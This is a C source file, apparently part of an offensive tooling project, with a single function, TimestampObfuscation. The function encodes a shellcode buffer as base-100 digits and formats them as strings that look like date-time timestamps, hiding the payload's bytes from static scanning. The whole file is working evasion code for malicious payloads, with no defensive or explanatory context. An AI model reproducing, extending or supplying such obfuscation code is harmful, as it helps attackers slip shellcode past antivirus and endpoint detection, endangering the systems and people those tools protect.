#include "Common.h"

char** TimestampObfuscation(
    PBYTE   pShellcode,
    SIZE_T  sShellcodeSize,
    SIZE_T* sNumberOfTimestamps
) {
    PBYTE   pNum = NULL;
    int* pDigits = NULL;
    int     nCapacity = 0;
    int     nNumDigits = 0;
    char** ppTimestampArray = NULL;

    *sNumberOfTimestamps = 0;

    pNum = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sShellcodeSize);
    if (pNum == NULL) {
        return NULL;
    }

    memcpy(pNum, pShellcode, sShellcodeSize);

    // Estimate capacity for digits
    nCapacity = (int)(sShellcodeSize * 1.3) + 10;
    pDigits = (int*)HeapAlloc(GetProcessHeap(), 0, nCapacity * sizeof(int));
    if (pDigits == NULL) {
        HeapFree(GetProcessHeap(), 0, pNum);
        return NULL;
    }

    // Extract digits in base-100
    while (TRUE) {
        BOOL bIsZero = TRUE;

        for (SIZE_T i = 0; i < sShellcodeSize; i++) {
            if (pNum[i] != 0) {
                bIsZero = FALSE;
                break;
            }
        }

        if (bIsZero) {
            break;
        }

        int nRem = 0;
        for (SIZE_T i = 0; i < sShellcodeSize; i++) {
            long long llTemp = (long long)nRem * 256 + pNum[i];
            pNum[i] = (BYTE)(llTemp / 100);
            nRem = (int)(llTemp % 100);
        }

        pDigits[nNumDigits++] = nRem;

        // Resize if needed
        if (nNumDigits >= nCapacity) {
            nCapacity *= 2;
            int* pNewDigits = (int*)HeapReAlloc(GetProcessHeap(), 0, pDigits, nCapacity * sizeof(int));
            if (pNewDigits == NULL) {
                HeapFree(GetProcessHeap(), 0, pDigits);
                HeapFree(GetProcessHeap(), 0, pNum);
                return NULL;
            }
            pDigits = pNewDigits;
        }
    }

    HeapFree(GetProcessHeap(), 0, pNum);

    // Pad to multiple of 7 (for timestamp groups)
    int nNumGroups = (nNumDigits + 6) / 7;
    int nPaddedDigits = nNumGroups * 7;

    int* pNewDigits = (int*)HeapReAlloc(GetProcessHeap(), 0, pDigits, nPaddedDigits * sizeof(int));
    if (pNewDigits == NULL) {
        HeapFree(GetProcessHeap(), 0, pDigits);
        return NULL;
    }
    pDigits = pNewDigits;

    // Pad with zeros
    for (int i = nNumDigits; i < nPaddedDigits; i++) {
        pDigits[i] = 0;
    }

    nNumDigits = nPaddedDigits;

    // Allocate timestamp array
    ppTimestampArray = (char**)HeapAlloc(GetProcessHeap(), 0, nNumGroups * sizeof(char*));
    if (ppTimestampArray == NULL) {
        HeapFree(GetProcessHeap(), 0, pDigits);
        return NULL;
    }

    // Build timestamp strings
    for (int i = 0; i < nNumGroups; i++) {
        int nIdx = i * 7;
        int nSec = pDigits[nIdx + 0];
        int nMin = pDigits[nIdx + 1];
        int nHour = pDigits[nIdx + 2];
        int nDay = pDigits[nIdx + 3];
        int nMonth = pDigits[nIdx + 4];
        int nYearLo = pDigits[nIdx + 5];
        int nYearHi = pDigits[nIdx + 6];
        int nYear = nYearHi * 100 + nYearLo;

        ppTimestampArray[i] = (char*)HeapAlloc(GetProcessHeap(), 0, 32);  // "YYYY-MM-DD HH:MM:SS\0"
        if (ppTimestampArray[i] == NULL) {
            // Cleanup partial allocations
            for (int j = 0; j < i; j++) {
                HeapFree(GetProcessHeap(), 0, ppTimestampArray[j]);
            }
            HeapFree(GetProcessHeap(), 0, ppTimestampArray);
            HeapFree(GetProcessHeap(), 0, pDigits);
            return NULL;
        }

        sprintf_s(ppTimestampArray[i], 32, "%04d-%02d-%02d %02d:%02d:%02d",
            nYear, nMonth, nDay, nHour, nMin, nSec);
    }

    HeapFree(GetProcessHeap(), 0, pDigits);

    *sNumberOfTimestamps = nNumGroups;
    return ppTimestampArray;
}